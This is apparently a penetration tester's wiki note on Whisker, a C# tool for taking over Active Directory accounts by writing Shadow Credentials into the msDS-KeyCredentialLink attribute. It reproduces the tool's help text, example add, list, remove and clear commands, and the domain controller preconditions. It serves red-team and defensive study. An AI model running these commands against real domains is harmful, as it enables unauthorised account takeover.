# Whisker

[Whisker](https://github.com/eladshamir/Whisker) *is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account. This tool is based on code from [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) by Michael Grafnetter ([@MGrafnetter](https://twitter.com/MGrafnetter)).* 

Locally: [[Shadow-Credentials]] or cited by [eladshamir](https://github.com/eladshamir) [Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

It will conveniently output a full Rubeus command string -  [[Rubeus-Cheatsheet]]

```cs
 .\Whisker.exe --help

Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their
msDS-KeyCredentialLink attribute, effectively adding Shadow Credentials to the target account.

  Usage: ./Whisker.exe [list|add|remove|clear] /target:<samAccountName> [/deviceID:<GUID>] [/domain:<FQDN>]
               [/dc:<IP/HOSTNAME>] [/password:<PASWORD>] [/path:<PATH>]

  Modes
    list            List all the values of the the msDS-KeyCredentialLink attribute of a target object
    add             Add a new value to the msDS-KeyCredentialLink attribute of a target object
    remove          Remove a value from the msDS-KeyCredentialLink attribute of a target object
    clear           Clear all the values of the the msDS-KeyCredentialLink attribute of a target object.
                    Warning: Clearing the msDS-KeyCredentialLink attribute of accounts configured for
                    passwordless authentication will cause disruptions.

  Arguments:
    /target:<samAccountName>  Required. Set the target name. Computer objects should end with a '$' sign.

    /deviceID:<GUID>          [remove mode] Required in remove mode. Set the DeviceID of the value to remove from the
                              attribute msDS-KeyCredentialLink of the target object. Must be a valid GUID.

    [/domain:<FQDN>]          Optional. Set the target Fully Qualified Domain Name (FQDN). If not provided, will try to
                              resolve the FQDN of the current user.

    [/dc:<IP/HOSTNAME>]       Optional. Set the target Domain Controller (DC). If not provided, will try to target the
                              Primary Domain Controller (PDC).

    [/password:<PASWORD>]     [add mode] Optional in add mode. Set the password for the stored self-signed certificate.
                              If not provided, a random password will be generated.

    [/path:<PATH>]            [add mode] Optional in add mode. Set the path to store the generated self-signed certificate
                              for authentication. If not provided, the certificate will be printed as a Base64 blob.

==[Examples]=========

  list    => Whisker.exe list /target:computername$ /domain:constoso.local /dc:dc1.contoso.local
  add     => Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
  remove  => Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /deviceid:2de4643a-2e0b-438f-a99d-5cb058b3254b
  clear   => Whisker.exe clear /target:computername$ /domain:constoso.local /dc:dc1.contoso.local

For this attack to succeed, the environment must have a Domain Controller running at least Windows Server 2016,
and the Domain Controller must have a server authentication certificate to allow for PKINIT Kerberos authentication.

This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter).
```

## References

[Github Whisker](https://github.com/eladshamir/Whisker) 
[Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)